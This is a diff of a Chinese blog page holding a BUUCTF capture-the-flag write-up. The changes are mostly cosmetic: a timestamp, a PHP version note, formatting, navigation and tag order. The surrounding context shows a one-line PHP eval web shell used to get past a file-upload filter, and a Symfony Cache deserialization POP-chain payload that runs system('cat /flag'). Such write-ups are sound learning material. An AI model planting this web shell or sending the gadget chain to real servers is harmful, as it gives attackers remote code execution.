@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/06/cWSvBD6AqeNUrfV.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/06/oRlAyKBV7trI46F.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/06/tEj259riLCHQvso.png">
-<meta property="og:updated_time" content="2019-11-06T07:41:58.658Z">
+<meta property="og:updated_time" content="2019-11-10T00:39:14.007Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-wp-4">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/05/rSGbiCULoe35tIY.png">
@@ -209,7 +209,7 @@
 
 <p>得到账号密码<code>admin</code>、<code>09969ed6330c3cd36702</code></p>
 <p><img src="https://i.loli.net/2019/11/05/gUvdneqa62bKFwJ.png" alt="Snipaste_2019-11-05_22-32-16.png"></p>
-<p>文件上传，说是将文件名写入了php文件中，并给出了文件路径，但是限制文件名中不能出现php，考虑到<code>X-Powered-By: PHP/5.5.9-1ubuntu4.29</code>，<code>php5.x</code>默认开启短标签</p>
+<p>文件上传，说是将文件名写入了php文件中，并给出了文件路径，但是限制文件名中不能出现php，考虑到<code>X-Powered-By: PHP/5.5.9-1ubuntu4.29</code>，<code>php5.5.x</code>默认开启短标签</p>
 <p>那么构造</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[pass]);?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -251,9 +251,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem = &apos;cat /flag&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">	private $setInnerItem = &apos;system&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">	public $deferred = [];</span><br><span class="line">	public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;pool = new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred = array(&apos;a&apos; =&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
 
 <p><strong>自己踩了几个坑，对php语法掌握不熟练</strong></p>
-<p><strong><code>private $deferred = array();</code>需要修改成 <code>public $deferred = array();</code></strong></p>
-<p><strong><code>class ProxyAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterface</code>实现的接口不需要写</strong></p>
-<p>*<em><code>public $deferred = array(&#39;aa&#39;=&gt;new \Symfony\Component\Cache\CacheItem);</code>在类中这种写法不允许， 类（对象）的属性是不能用非常量来初始化的！ 非常量是指变量，或函数返回值等  *</em></p>
+<p><code>private $deferred = array();</code>需要修改成<code>public $deferred = array();</code></p>
+<p><code>class ProxyAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterface</code>实现的接口不需要写</p>
+<p><code>public $deferred = array(&#39;aa&#39;=&gt;new \Symfony\Component\Cache\CacheItem);</code>在类中这种写法不允许， 类（对象）的属性是不能用非常量来初始化的！ 非常量是指变量，或函数返回值等 </p>
 <p><strong>看wp的时候看到szs， 利用<code>highlight_file(&#39;/flag&#39;,null)</code> ，但是这里第二个参数<code>$item</code>要为null，似乎不好构造</strong></p>
 <p>最后整理下POP链</p>
 <p><code>TagAwareAdapter.php</code>-&gt;<code>__destruct()</code>-&gt;<code>commit()</code>-&gt;<code>invalidateTags()</code>-&gt;<code>$this-&gt;pool-&gt;saveDeferred($item)</code></p>
@@ -450,11 +450,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/11/06/buuctf-wp-5/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/11/07/phpcms-v9-6-0任意文件上传漏洞复现-1/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          buuctf-wp-5
+          phpcms_v9.6.0任意文件上传漏洞复现
         
       </div>
     </a>
@@ -599,19 +599,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">tp5</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -623,11 +623,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
+                <a href="javascript:void(0)" class="js-tag color2">chinaz</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">chinaz</a>
+                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -655,15 +655,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -672,6 +668,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -687,11 +687,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+                <a href="javascript:void(0)" class="js-tag color4">xxe</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xxe</a>
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
